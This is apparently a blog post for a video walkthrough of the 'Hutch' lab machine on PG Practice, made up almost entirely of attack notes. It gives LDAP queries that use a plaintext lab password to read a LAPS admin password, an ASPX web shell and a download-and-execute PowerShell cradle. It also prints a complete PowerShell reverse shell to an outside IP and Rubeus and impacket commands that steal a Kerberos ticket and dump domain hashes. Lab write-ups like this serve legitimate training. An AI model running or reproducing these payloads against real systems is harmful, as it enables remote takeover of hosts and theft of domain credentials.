---
categories:
- CTF
image:
  path: https://img.youtube.com/vi/WMDLdrKbaSk/0.jpg
layout: post
media_subpath: /assets/posts/2021-11-20-ldap-webdav-laps-unintended-solutions-hutch-pg-practice
tags:
- pg practice
- rubeus
- webdav
- windows
title: LDAP, WebDAV, LAPS & Unintended Solutions - Hutch @ PG Practice
---

We are solving Hutch from PG-Practice. For user, we will get credentials from LDAP & use them to upload a web shell via Webdav. For root, we will read a LAPS password for the intended way & then explore other methods.

{% youtube WMDLdrKbaSk %}

## Notes

**LDAP**

```
// list all attributes
ldapsearch -x -b "dc=hutch,dc=offsec" "*" -h hutch.pg

// query LAPS password
ldapsearch -D fmcsorley@HUTCH.OFFSEC -w CrabSharkJellyfish192 -o ldif-wrap=no -b 'dc=hutch,dc=offsec' -h hutch.pg "(ms-MCS-AdmPwd=*)" ms-Mcs-AdmPwd
```

**ASPX Runner**

```
iex(iwr http://ip/run.txt -usebasicparsing)
```

```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<script Language="c#" runat="server">

void Page_Load(object sender, EventArgs e){
 ProcessStartInfo si = new ProcessStartInfo();
 si.FileName = "powershell.exe";
 si.Arguments = "-enc ...";
 Process p = Process.Start(si);
 p.WaitForExit();
}
</script>
```

**Run.txt**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ip",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ">_ ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Rubeus TGTDeleg**

```
iwr http://ip/Rubeus.exe -outfile Rubeus.exe
.\Rubeus.exe tgtdeleg /nowrap
// copy ticket over & base64 decode, then:
python3 /opt/impacket/examples/ticketConverter.py m.kirbi m.ccache
export KRB5CCNAME=`pwd`/m.ccache
sudo ntpdate -u hutch.pg
python3 /opt/impacket/examples/secretsdump.py HUTCH.OFFSEC/HUTCHDC\$@hutchdc.hutch.offsec -dc-ip hutch.offsec -no-pass -k
```